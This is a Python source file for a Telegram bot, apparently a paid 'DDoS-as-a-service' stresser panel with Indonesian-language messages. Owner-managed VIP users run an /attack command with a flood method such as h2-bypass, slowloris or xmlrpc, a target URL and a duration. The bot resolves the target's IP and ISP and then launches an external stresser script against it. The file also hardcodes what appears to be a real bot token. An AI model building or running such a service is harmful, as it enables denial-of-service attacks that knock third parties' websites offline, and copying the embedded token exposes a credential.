import telebot
import subprocess
import requests
import threading
import time
import os
import json
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ================= CONFIG =================
BOT_TOKEN = '8534838890:AAF6iwTMRjRg4epU3K4MEPD67Ezz-42xc1M'
OWNER_ID = 7257448216  # Ganti pake ID Telegram LU (Admin Utama)
DB_FILE = 'users.json'
# ==========================================

bot = telebot.TeleBot(BOT_TOKEN)

# --- Fungsi Database User ---
def load_users():
    if not os.path.exists(DB_FILE):
        # Kalo file belum ada, bikin baru dan masukin Owner sebagai VIP Seumur Hidup
        default_data = {str(OWNER_ID): "2099-12-31"}
        with open(DB_FILE, 'w') as f:
            json.dump(default_data, f, indent=4)
        return default_data
    with open(DB_FILE, 'r') as f:
        return json.load(f)

def save_users(users):
    with open(DB_FILE, 'w') as f:
        json.dump(users, f, indent=4)

def check_access(user_id):
    users = load_users()
    user_str = str(user_id)
    
    # Owner selalu punya akses
    if user_id == OWNER_ID:
        return True, "Owner"
        
    if user_str not in users:
        return False, "Lu kaga ada di daftar VIP, cuy! Bayar dulu sana ke Owner. 😈"
    
    expired_date = datetime.strptime(users[user_str], "%Y-%m-%d").date()
    today = datetime.now().date()
    
    if today > expired_date:
        return False, f"Masa aktif lu udah abis bray! (Expired: {expired_date}). Hubungi Owner buat perpanjang."
    
    return True, f"VIP (Sampai {expired_date})"

# --- Fungsi Cek IP ---
def get_ip_info(domain):
    try:
        ip = requests.get(f"https://dns.google/resolve?name={domain}&type=A", timeout=3).json()['Answer'][0]['data']
        info = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
        return ip, info.get('isp', 'Unknown ISP')
    except Exception:
        return "0.0.0.0", "Unknown"

# --- Fungsi Eksekusi Attack ---
def run_attack_background(chat_id, message_id, method, url, duration):
    # Panggil CezzyStresser.py
    command = f"python3 CezzyStresser.py"
    process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    # Format input: method url port time concurrency
    # Gua set concurrency 100 biar VPS lu ga langsung OOM (bisa lu ubah di sini)
    input_data = f"{method} {url} 443 {duration} 100\n"
    
    process.communicate(input=input_data)
    
    # Edit pesan Telegram kalau udah selesai
    try:
        bot.edit_message_text(
            chat_id=chat_id, 
            message_id=message_id, 
            text=f"✅ **Attack Finished!**\nTarget: `{url}`\nMethod: `{method}`", 
            parse_mode='Markdown'
        )
    except:
        pass

# --- COMMAND: /start ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    has_access, status = check_access(message.from_user.id)
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("📢 Channel CezzyProject", url="https://t.me/CezzyProject"))
    
    if not has_access:
        bot.reply_to(message, f"⚠️ {status}")
        return

    text = f"""
😈 **CEZZY STRESSER PANEL** 😈
Status: `{status}`

**Format Attack:**
`/attack <method> <url> <time>`
Contoh: `/attack h2-bypass https://target.com 60`

**Methods Tersedia:**
`h2-bypass`, `flash`, `http-blitz`, `slowloris`, `post-heavy`, `xmlrpc`
"""
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode='Markdown')

# --- COMMAND: /adduser (KHUSUS OWNER) ---
@bot.message_handler(commands=['adduser'])
def add_user(message):
    if message.from_user.id != OWNER_ID:
        return
        
    try:
        args = message.text.split()
        if len(args) < 3:
            bot.reply_to(message, "Format: `/adduser <ID_TELE> <HARI>`\nContoh: `/adduser 987654321 30`", parse_mode='Markdown')
            return
            
        target_id = args[1]
        days = int(args[2])
        
        users = load_users()
        expired = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
        users[target_id] = expired
        save_users(users)
        
        bot.reply_to(message, f"✅ User `{target_id}` berhasil ditambahin VIP selama {days} hari (Sampai {expired})", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

# --- COMMAND: /removeuser (KHUSUS OWNER) ---
@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    if message.from_user.id != OWNER_ID:
        return
        
    try:
        args = message.text.split()
        target_id = args[1]
        
        users = load_users()
        if target_id in users:
            del users[target_id]
            save_users(users)
            bot.reply_to(message, f"✅ User `{target_id}` berhasil dihapus dari VIP.", parse_mode='Markdown')
        else:
            bot.reply_to(message, "❌ ID tersebut gak ada di database.")
    except Exception as e:
        bot.reply_to(message, f"Format salah! Ketik: `/removeuser <ID_TELE>`")

# --- COMMAND: /attack ---
@bot.message_handler(commands=['attack'])
def attack_command(message):
    has_access, status = check_access(message.from_user.id)
    if not has_access:
        bot.reply_to(message, f"⚠️ {status}")
        return
        
    try:
        args = message.text.split()
        if len(args) < 4:
            bot.reply_to(message, "❌ Format salah cuy!\nContoh: `/attack h2-bypass https://target.com 60`", parse_mode='Markdown')
            return

        method = args[1].lower()
        target_url = args[2]
        duration = args[3]
        
        target_domain = target_url.replace("https://", "").replace("http://", "").split("/")[0]
        
        msg = bot.reply_to(message, "⏳ *Mengambil data target...*", parse_mode='Markdown')
        ip, isp = get_ip_info(target_domain)
        
        attack_text = f"""
🚀 **Attack Sent!**

**User:** {message.from_user.first_name}
**Target:** {target_url}
**Duration:** {duration}s
**Method:** {method}
**ISP:** {isp}
**IP:** {ip}
**Server:** 1/1
**owner:** t.me/CezzyProject
"""
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Check Target", url=target_url))

        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=attack_text,
            reply_markup=markup,
            parse_mode='Markdown'
        )
        
        thread = threading.Thread(target=run_attack_background, args=(message.chat.id, msg.message_id, method, target_url, duration))
        thread.daemon = True
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

print("CEZZY DaaS BOT NYALA... 🔥")
bot.infinity_polling()
